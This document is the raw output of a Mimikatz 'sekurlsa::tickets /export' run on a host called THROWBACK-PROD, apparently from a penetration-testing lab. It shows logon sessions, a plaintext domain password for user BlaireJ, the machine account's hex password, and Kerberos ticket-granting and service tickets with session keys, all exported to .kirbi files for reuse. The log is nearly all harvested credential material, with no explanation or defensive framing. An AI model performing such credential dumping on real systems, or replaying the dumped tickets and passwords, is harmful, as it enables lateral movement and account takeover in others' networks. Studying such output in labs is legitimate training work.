# sekurlsa Prod Output
```mimikatz
mimikatz # sekurlsa::tickets /export

Authentication Id : 0 ; 540478 (00000000:00083f3e)
Session           : RemoteInteractive from 2
User Name         : PetersJ
Domain            : THROWBACK
Logon Server      : THROWBACK-DC01
Logon Time        : 4/20/2022 10:32:42 AM
SID               : S-1-5-21-3906589501-690843102-3982269896-1202

         * Username : PetersJ
         * Domain   : THROWBACK.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 4/20/2022 10:32:43 AM ; 4/20/2022 8:32:42 PM ; 4/27/2022 10:32:42 AM
           Service Name (02) : LDAP ; THROWBACK-DC01.THROWBACK.local ; THROWBACK.local ; @ THROWBACK.LOCAL
           Target Name  (02) : LDAP ; THROWBACK-DC01.THROWBACK.local ; THROWBACK.local ; @ THROWBACK.LOCAL
           Client Name  (01) : PetersJ ; @ THROWBACK.LOCAL ( THROWBACK.LOCAL )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             a326a344265e66c48e218382b28d1b94f052478e398b13aed6fa9c821fef83ec
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 6        [...]
           * Saved to file [0;83f3e]-0-0-40a50000-PetersJ@LDAP-THROWBACK-DC01.THROWBACK.local.kirbi !

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 4/20/2022 10:32:42 AM ; 4/20/2022 8:32:42 PM ; 4/27/2022 10:32:42 AM
           Service Name (02) : krbtgt ; THROWBACK.LOCAL ; @ THROWBACK.LOCAL
           Target Name  (02) : krbtgt ; THROWBACK.local ; @ THROWBACK.LOCAL
           Client Name  (01) : PetersJ ; @ THROWBACK.LOCAL ( THROWBACK.local )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             7cda5829b552d26ccf85366016ee7fd772df043d3c06bd88c0442c82cb2b84c8
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;83f3e]-2-0-40e10000-PetersJ@krbtgt-THROWBACK.LOCAL.kirbi !

Authentication Id : 0 ; 504233 (00000000:0007b1a9)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/20/2022 10:32:42 AM
SID               : S-1-5-90-0-2

         * Username : THROWBACK-PROD$
         * Domain   : THROWBACK.local
         * Password : 28 40 64 6b 74 5f 9a 66 2b b7 e5 80 ba 73 b2 68 43 b6 2b d0 5d 1f 54 9c a0 53 b7 3e 35 16 64 62 65 cc 1d 39 66 86 30 4f 2e 69 9c a9 39 23 af bd e4 d7 84 d1 1f 28 4a a6 d7 fb c0 e8 24 df cf f1 dc ea 16 41 68 66 ac e7 e5 14 0e f1 3e b4 83 2c ae 59 25 d1 50 9b fd 89 c9 cc a0 27 e8 ce 00 db de 78 b2 4e 52 ec d7 bf 6c b4 d2 63 1d de c9 0c f1 2b 73 89 29 7a 09 20 bd 10 29 d1 7b ba 5c db d4 1b 3a 6d 9c 2e 1c 3e f6 62 f4 ca e8 9e 52 ad 19 88 e5 3d c9 6b 3d 4d 63 0b 59 19 65 5c b8 ae ee 0a fc d8 58 dd 78 bc 2f 21 30 04 65 9b f6 db 1f 46 bd 7d 76 25 be 85 76 b5 4c 15 ed 76 77 b0 c4 ef 19 5f 27 e5 b9 d0 91 35 15 bd e6 a6 54 e6 eb ae b1 14 7f 7b e0 99 3e cd 9b b1 3a 82 5f 70 df 01 3f 15 14 82 a5 cc c3 c5 7c ca 90 9a 80 e4

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 218170 (00000000:0003543a)
Session           : Batch from 0
User Name         : BlaireJ
Domain            : THROWBACK
Logon Server      : THROWBACK-DC01
Logon Time        : 4/20/2022 10:23:47 AM
SID               : S-1-5-21-3906589501-690843102-3982269896-1116

         * Username : BlaireJ
         * Domain   : THROWBACK.LOCAL
         * Password : 7eQgx6YzxgG3vC45t5k9

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 62220 (00000000:0000f30c)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/20/2022 10:23:33 AM
SID               : S-1-5-90-0-1

         * Username : THROWBACK-PROD$
         * Domain   : THROWBACK.local
         * Password : 28 40 64 6b 74 5f 9a 66 2b b7 e5 80 ba 73 b2 68 43 b6 2b d0 5d 1f 54 9c a0 53 b7 3e 35 16 64 62 65 cc 1d 39 66 86 30 4f 2e 69 9c a9 39 23 af bd e4 d7 84 d1 1f 28 4a a6 d7 fb c0 e8 24 df cf f1 dc ea 16 41 68 66 ac e7 e5 14 0e f1 3e b4 83 2c ae 59 25 d1 50 9b fd 89 c9 cc a0 27 e8 ce 00 db de 78 b2 4e 52 ec d7 bf 6c b4 d2 63 1d de c9 0c f1 2b 73 89 29 7a 09 20 bd 10 29 d1 7b ba 5c db d4 1b 3a 6d 9c 2e 1c 3e f6 62 f4 ca e8 9e 52 ad 19 88 e5 3d c9 6b 3d 4d 63 0b 59 19 65 5c b8 ae ee 0a fc d8 58 dd 78 bc 2f 21 30 04 65 9b f6 db 1f 46 bd 7d 76 25 be 85 76 b5 4c 15 ed 76 77 b0 c4 ef 19 5f 27 e5 b9 d0 91 35 15 bd e6 a6 54 e6 eb ae b1 14 7f 7b e0 99 3e cd 9b b1 3a 82 5f 70 df 01 3f 15 14 82 a5 cc c3 c5 7c ca 90 9a 80 e4

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : THROWBACK-PROD$
Domain            : THROWBACK
Logon Server      : (null)
Logon Time        : 4/20/2022 10:23:32 AM
SID               : S-1-5-20

         * Username : throwback-prod$
         * Domain   : THROWBACK.LOCAL
         * Password : 28 40 64 6b 74 5f 9a 66 2b b7 e5 80 ba 73 b2 68 43 b6 2b d0 5d 1f 54 9c a0 53 b7 3e 35 16 64 62 65 cc 1d 39 66 86 30 4f 2e 69 9c a9 39 23 af bd e4 d7 84 d1 1f 28 4a a6 d7 fb c0 e8 24 df cf f1 dc ea 16 41 68 66 ac e7 e5 14 0e f1 3e b4 83 2c ae 59 25 d1 50 9b fd 89 c9 cc a0 27 e8 ce 00 db de 78 b2 4e 52 ec d7 bf 6c b4 d2 63 1d de c9 0c f1 2b 73 89 29 7a 09 20 bd 10 29 d1 7b ba 5c db d4 1b 3a 6d 9c 2e 1c 3e f6 62 f4 ca e8 9e 52 ad 19 88 e5 3d c9 6b 3d 4d 63 0b 59 19 65 5c b8 ae ee 0a fc d8 58 dd 78 bc 2f 21 30 04 65 9b f6 db 1f 46 bd 7d 76 25 be 85 76 b5 4c 15 ed 76 77 b0 c4 ef 19 5f 27 e5 b9 d0 91 35 15 bd e6 a6 54 e6 eb ae b1 14 7f 7b e0 99 3e cd 9b b1 3a 82 5f 70 df 01 3f 15 14 82 a5 cc c3 c5 7c ca 90 9a 80 e4

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 4/20/2022 10:53:33 AM ; 4/20/2022 8:24:34 PM ; 4/27/2022 10:24:34 AM
           Service Name (02) : ldap ; throwback-dc01.throwback.local ; THROWBACK.local ; @ THROWBACK.LOCAL
           Target Name  (02) : ldap ; throwback-dc01.throwback.local ; THROWBACK.local ; @ THROWBACK.LOCAL
           Client Name  (01) : THROWBACK-PROD$ ; @ THROWBACK.LOCAL ( THROWBACK.LOCAL )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             efeb983755fc4a166ef65f9e74e7b9e29668c869804d8cd7d11003ab9c77eee5
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 6        [...]
           * Saved to file [0;3e4]-0-0-40a50000-THROWBACK-PROD$@ldap-throwback-dc01.throwback.local.kirbi !
         [00000001]
           Start/End/MaxRenew: 4/20/2022 10:25:38 AM ; 4/20/2022 8:24:34 PM ; 4/27/2022 10:24:34 AM
           Service Name (02) : ldap ; throwback-dc01.throwback.local ; @ THROWBACK.LOCAL
           Target Name  (02) : ldap ; throwback-dc01.throwback.local ; @ THROWBACK.LOCAL
           Client Name  (01) : THROWBACK-PROD$ ; @ THROWBACK.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             14e7d525abc7005a33142f67f39f96e03e0f271c25cdd0f25b3dee288ff4af63
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 6        [...]
           * Saved to file [0;3e4]-0-1-40a50000-THROWBACK-PROD$@ldap-throwback-dc01.throwback.local.kirbi !
         [00000002]
           Start/End/MaxRenew: 4/20/2022 10:25:04 AM ; 4/20/2022 8:24:34 PM ; 4/27/2022 10:24:34 AM
           Service Name (02) : DNS ; throwback-dc01.throwback.local ; @ THROWBACK.LOCAL
           Target Name  (02) : DNS ; throwback-dc01.throwback.local ; @ THROWBACK.LOCAL
           Client Name  (01) : THROWBACK-PROD$ ; @ THROWBACK.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             034483e769513fee0d5bc9bfeb930eca2ba251d50af2d4349a4957043e72b49d
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 6        [...]
           * Saved to file [0;3e4]-0-2-40a50000-THROWBACK-PROD$@DNS-throwback-dc01.throwback.local.kirbi !
         [00000003]
           Start/End/MaxRenew: 4/20/2022 10:24:34 AM ; 4/20/2022 8:24:34 PM ; 4/27/2022 10:24:34 AM
           Service Name (02) : cifs ; THROWBACK-DC01.THROWBACK.local ; @ THROWBACK.LOCAL
           Target Name  (02) : cifs ; THROWBACK-DC01.THROWBACK.local ; @ THROWBACK.LOCAL
           Client Name  (01) : THROWBACK-PROD$ ; @ THROWBACK.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             dc1e987ca08ac28fb0961b8b3c9ffcdc7c310a54c11936942278768f62e8f12b
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 6        [...]
           * Saved to file [0;3e4]-0-3-40a50000-THROWBACK-PROD$@cifs-THROWBACK-DC01.THROWBACK.local.kirbi !

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 4/20/2022 10:24:34 AM ; 4/20/2022 8:24:34 PM ; 4/27/2022 10:24:34 AM
           Service Name (02) : krbtgt ; THROWBACK.LOCAL ; @ THROWBACK.LOCAL
           Target Name  (--) : @ THROWBACK.LOCAL
           Client Name  (01) : THROWBACK-PROD$ ; @ THROWBACK.LOCAL ( $$Delegation Ticket$$ )
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             5e8de1694d2bc903c3c42d38d95ef666791a9a27c4df46bebc2419076e9d5315
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3e4]-2-0-60a10000-THROWBACK-PROD$@krbtgt-THROWBACK.LOCAL.kirbi !
         [00000001]
           Start/End/MaxRenew: 4/20/2022 10:24:34 AM ; 4/20/2022 8:24:34 PM ; 4/27/2022 10:24:34 AM
           Service Name (02) : krbtgt ; THROWBACK.LOCAL ; @ THROWBACK.LOCAL
           Target Name  (02) : krbtgt ; THROWBACK.local ; @ THROWBACK.LOCAL
           Client Name  (01) : THROWBACK-PROD$ ; @ THROWBACK.LOCAL ( THROWBACK.local )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             7df1b3acb8663664e2b39d30368b421f836386f29dcdff60730f82890306e83b
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3e4]-2-1-40e10000-THROWBACK-PROD$@krbtgt-THROWBACK.LOCAL.kirbi !

Authentication Id : 0 ; 32509 (00000000:00007efd)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/20/2022 10:23:32 AM
SID               : S-1-5-96-0-1

         * Username : THROWBACK-PROD$
         * Domain   : THROWBACK.local
         * Password : 28 40 64 6b 74 5f 9a 66 2b b7 e5 80 ba 73 b2 68 43 b6 2b d0 5d 1f 54 9c a0 53 b7 3e 35 16 64 62 65 cc 1d 39 66 86 30 4f 2e 69 9c a9 39 23 af bd e4 d7 84 d1 1f 28 4a a6 d7 fb c0 e8 24 df cf f1 dc ea 16 41 68 66 ac e7 e5 14 0e f1 3e b4 83 2c ae 59 25 d1 50 9b fd 89 c9 cc a0 27 e8 ce 00 db de 78 b2 4e 52 ec d7 bf 6c b4 d2 63 1d de c9 0c f1 2b 73 89 29 7a 09 20 bd 10 29 d1 7b ba 5c db d4 1b 3a 6d 9c 2e 1c 3e f6 62 f4 ca e8 9e 52 ad 19 88 e5 3d c9 6b 3d 4d 63 0b 59 19 65 5c b8 ae ee 0a fc d8 58 dd 78 bc 2f 21 30 04 65 9b f6 db 1f 46 bd 7d 76 25 be 85 76 b5 4c 15 ed 76 77 b0 c4 ef 19 5f 27 e5 b9 d0 91 35 15 bd e6 a6 54 e6 eb ae b1 14 7f 7b e0 99 3e cd 9b b1 3a 82 5f 70 df 01 3f 15 14 82 a5 cc c3 c5 7c ca 90 9a 80 e4

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 32409 (00000000:00007e99)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/20/2022 10:23:32 AM
SID               : S-1-5-96-0-0

         * Username : THROWBACK-PROD$
         * Domain   : THROWBACK.local
         * Password : 28 40 64 6b 74 5f 9a 66 2b b7 e5 80 ba 73 b2 68 43 b6 2b d0 5d 1f 54 9c a0 53 b7 3e 35 16 64 62 65 cc 1d 39 66 86 30 4f 2e 69 9c a9 39 23 af bd e4 d7 84 d1 1f 28 4a a6 d7 fb c0 e8 24 df cf f1 dc ea 16 41 68 66 ac e7 e5 14 0e f1 3e b4 83 2c ae 59 25 d1 50 9b fd 89 c9 cc a0 27 e8 ce 00 db de 78 b2 4e 52 ec d7 bf 6c b4 d2 63 1d de c9 0c f1 2b 73 89 29 7a 09 20 bd 10 29 d1 7b ba 5c db d4 1b 3a 6d 9c 2e 1c 3e f6 62 f4 ca e8 9e 52 ad 19 88 e5 3d c9 6b 3d 4d 63 0b 59 19 65 5c b8 ae ee 0a fc d8 58 dd 78 bc 2f 21 30 04 65 9b f6 db 1f 46 bd 7d 76 25 be 85 76 b5 4c 15 ed 76 77 b0 c4 ef 19 5f 27 e5 b9 d0 91 35 15 bd e6 a6 54 e6 eb ae b1 14 7f 7b e0 99 3e cd 9b b1 3a 82 5f 70 df 01 3f 15 14 82 a5 cc c3 c5 7c ca 90 9a 80 e4

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 1142819 (00000000:00117023)
Session           : Interactive from 0
User Name         : admin-petersj
Domain            : THROWBACK-PROD
Logon Server      : THROWBACK-PROD
Logon Time        : 4/20/2022 10:44:19 AM
SID               : S-1-5-21-1142397155-17714838-1651365392-1010

         * Username : admin-petersj
         * Domain   : THROWBACK-PROD
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 503541 (00000000:0007aef5)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/20/2022 10:32:42 AM
SID               : S-1-5-96-0-2

         * Username : THROWBACK-PROD$
         * Domain   : THROWBACK.local
         * Password : 28 40 64 6b 74 5f 9a 66 2b b7 e5 80 ba 73 b2 68 43 b6 2b d0 5d 1f 54 9c a0 53 b7 3e 35 16 64 62 65 cc 1d 39 66 86 30 4f 2e 69 9c a9 39 23 af bd e4 d7 84 d1 1f 28 4a a6 d7 fb c0 e8 24 df cf f1 dc ea 16 41 68 66 ac e7 e5 14 0e f1 3e b4 83 2c ae 59 25 d1 50 9b fd 89 c9 cc a0 27 e8 ce 00 db de 78 b2 4e 52 ec d7 bf 6c b4 d2 63 1d de c9 0c f1 2b 73 89 29 7a 09 20 bd 10 29 d1 7b ba 5c db d4 1b 3a 6d 9c 2e 1c 3e f6 62 f4 ca e8 9e 52 ad 19 88 e5 3d c9 6b 3d 4d 63 0b 59 19 65 5c b8 ae ee 0a fc d8 58 dd 78 bc 2f 21 30 04 65 9b f6 db 1f 46 bd 7d 76 25 be 85 76 b5 4c 15 ed 76 77 b0 c4 ef 19 5f 27 e5 b9 d0 91 35 15 bd e6 a6 54 e6 eb ae b1 14 7f 7b e0 99 3e cd 9b b1 3a 82 5f 70 df 01 3f 15 14 82 a5 cc c3 c5 7c ca 90 9a 80 e4

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 94883 (00000000:000172a3)
Session           : Batch from 0
User Name         : Administrator
Domain            : THROWBACK-PROD
Logon Server      : THROWBACK-PROD
Logon Time        : 4/20/2022 10:23:34 AM
SID               : S-1-5-21-1142397155-17714838-1651365392-500

         * Username : Administrator
         * Domain   : THROWBACK-PROD
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 4/20/2022 10:23:33 AM
SID               : S-1-5-19

         * Username : (null)
         * Domain   : (null)
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : THROWBACK-PROD$
Domain            : THROWBACK
Logon Server      : (null)
Logon Time        : 4/20/2022 10:23:31 AM
SID               : S-1-5-18

         * Username : throwback-prod$
         * Domain   : THROWBACK.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 4/20/2022 10:54:34 AM ; 4/20/2022 8:39:01 PM ; 4/27/2022 10:39:01 AM
           Service Name (02) : cifs ; THROWBACK-DC01.THROWBACK.local ; THROWBACK.local ; @ THROWBACK.LOCAL
           Target Name  (02) : cifs ; THROWBACK-DC01.THROWBACK.local ; THROWBACK.local ; @ THROWBACK.LOCAL
           Client Name  (01) : THROWBACK-PROD$ ; @ THROWBACK.LOCAL ( THROWBACK.local )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             212769a3c76fb6931d3942722e775b9f3e29e1ac0d9d92ac74910612d7070193
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 6        [...]
           * Saved to file [0;3e7]-0-0-40a50000-THROWBACK-PROD$@cifs-THROWBACK-DC01.THROWBACK.local.kirbi !
         [00000001]
           Start/End/MaxRenew: 4/20/2022 10:54:34 AM ; 4/20/2022 8:39:01 PM ; 4/27/2022 10:39:01 AM
           Service Name (01) : THROWBACK-PROD$ ; @ THROWBACK.LOCAL
           Target Name  (01) : THROWBACK-PROD$ ; @ THROWBACK.LOCAL
           Client Name  (01) : THROWBACK-PROD$ ; @ THROWBACK.LOCAL
           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             7de4f136d24955bd728c30aada4207d56b1517f26c4edce78fce1d0a51640600
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 4        [...]
           * Saved to file [0;3e7]-0-1-40a10000.kirbi !
         [00000002]
           Start/End/MaxRenew: 4/20/2022 10:28:47 AM ; 4/20/2022 8:25:02 PM ; 4/27/2022 10:25:02 AM
           Service Name (02) : ldap ; throwback-dc01.throwback.local ; @ THROWBACK.LOCAL
           Target Name  (02) : ldap ; throwback-dc01.throwback.local ; @ THROWBACK.LOCAL
           Client Name  (01) : THROWBACK-PROD$ ; @ THROWBACK.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             9855ccc690d7679dfa415f1637a264c173b529d3f59e4025af0a0c1fc22596b2
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 6        [...]
           * Saved to file [0;3e7]-0-2-40a50000-THROWBACK-PROD$@ldap-throwback-dc01.throwback.local.kirbi !
         [00000003]
           Start/End/MaxRenew: 4/20/2022 10:25:02 AM ; 4/20/2022 8:25:02 PM ; 4/27/2022 10:25:02 AM
           Service Name (02) : LDAP ; THROWBACK-DC01.THROWBACK.local ; THROWBACK.local ; @ THROWBACK.LOCAL
           Target Name  (02) : LDAP ; THROWBACK-DC01.THROWBACK.local ; THROWBACK.local ; @ THROWBACK.LOCAL
           Client Name  (01) : THROWBACK-PROD$ ; @ THROWBACK.LOCAL ( THROWBACK.LOCAL )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             bb372b8d25bcd3b468178895885b8ba8900b426398b380d30b1de281d8a7d3ed
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 6        [...]
           * Saved to file [0;3e7]-0-3-40a50000-THROWBACK-PROD$@LDAP-THROWBACK-DC01.THROWBACK.local.kirbi !

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 4/20/2022 10:56:02 AM ; 4/20/2022 11:11:02 AM ; 4/27/2022 10:39:01 AM
           Service Name (01) : throwback-prod$ ; @ (null)
           Target Name  (10) : BlaireJ@THROWBACK.local ; @ (null)
           Client Name  (10) : BlaireJ@THROWBACK.local ; @ THROWBACK.LOCAL
           Flags 00a10000    : name_canonicalize ; pre_authent ; renewable ;
           Session Key       : 0x00000012 - aes256_hmac
             cc2444edb7c5fc2fdae64e68a41fe3f13550395fe4faeae89af76aea34896662
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 4        [...]
           * Saved to file [0;3e7]-1-0-00a10000.kirbi !
         [00000001]
           Start/End/MaxRenew: 4/20/2022 10:45:02 AM ; 4/20/2022 11:00:02 AM ; 4/27/2022 10:39:01 AM
           Service Name (01) : throwback-prod$ ; @ (null)
           Target Name  (10) : BlaireJ@THROWBACK.local ; @ (null)
           Client Name  (10) : BlaireJ@THROWBACK.local ; @ THROWBACK.LOCAL
           Flags 00a10000    : name_canonicalize ; pre_authent ; renewable ;
           Session Key       : 0x00000012 - aes256_hmac
             83cb51d3fb38b50ae9013f2e3b8102c67a443835fb34326bd29aaf18cac15884
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 4        [...]
           * Saved to file [0;3e7]-1-1-00a10000.kirbi !
         [00000002]
           Start/End/MaxRenew: 4/20/2022 10:35:02 AM ; 4/20/2022 10:50:02 AM ; 4/27/2022 10:25:02 AM
           Service Name (01) : throwback-prod$ ; @ (null)
           Target Name  (10) : BlaireJ@THROWBACK.local ; @ (null)
           Client Name  (10) : BlaireJ@THROWBACK.local ; @ THROWBACK.LOCAL
           Flags 00a10000    : name_canonicalize ; pre_authent ; renewable ;
           Session Key       : 0x00000012 - aes256_hmac
             3175bcf25ca4721bd9bcade9a4aee5720b86fe3713e966efccab593b87674887
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...]
           * Saved to file [0;3e7]-1-2-00a10000.kirbi !

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 4/20/2022 10:54:34 AM ; 4/20/2022 8:39:01 PM ; 4/27/2022 10:39:01 AM
           Service Name (02) : krbtgt ; THROWBACK.LOCAL ; @ THROWBACK.LOCAL
           Target Name  (--) : @ THROWBACK.LOCAL
           Client Name  (01) : THROWBACK-PROD$ ; @ THROWBACK.LOCAL ( $$Delegation Ticket$$ )
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             23e7fdeb97bf010dbe1a4fd3e96a3df1265994b3632ea671c5a7a7e6e1201c3c
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3e7]-2-0-60a10000-THROWBACK-PROD$@krbtgt-THROWBACK.LOCAL.kirbi !
         [00000001]
           Start/End/MaxRenew: 4/20/2022 10:39:01 AM ; 4/20/2022 8:39:01 PM ; 4/27/2022 10:39:01 AM
           Service Name (02) : krbtgt ; THROWBACK.LOCAL ; @ THROWBACK.LOCAL
           Target Name  (02) : krbtgt ; THROWBACK.LOCAL ; @ THROWBACK.LOCAL
           Client Name  (01) : THROWBACK-PROD$ ; @ THROWBACK.LOCAL ( THROWBACK.LOCAL )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             1fea44c8e69d859749fac827c0a05e73526d52de6021d606ae8553ad793ac30c
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3e7]-2-1-40e10000-THROWBACK-PROD$@krbtgt-THROWBACK.LOCAL.kirbi !

```